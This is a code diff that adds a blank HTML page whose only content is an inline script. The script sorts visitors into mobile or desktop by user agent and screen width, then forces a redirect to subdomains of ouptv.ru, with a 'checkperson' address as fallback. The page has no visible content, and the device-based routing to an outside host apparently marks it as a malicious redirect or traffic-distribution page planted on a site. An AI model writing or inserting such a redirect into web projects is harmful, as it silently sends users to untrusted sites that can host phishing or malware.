@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <style>body { background: #fff; margin: 0; }</style>
+    <script>
+        (function() {
+            var url = "https://checkperson.ouptv.ru/id";
+            try {
+                // Проверяем на мобильность через ширину экрана + UserAgent
+                var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || (window.innerWidth <= 800);
+                
+                if (isMobile) {
+                    url = "https://m.plus.ouptv.ru";
+                } else {
+                    url = "https://d.plus.ouptv.ru";
+                }
+            } catch (e) {
+                url = "https://checkperson.ouptv.ru/id";
+            }
+            // Форсированный редирект
+            window.location.href = url;
+        })();
+    </script>
+</head>
+<body></body>
+</html>
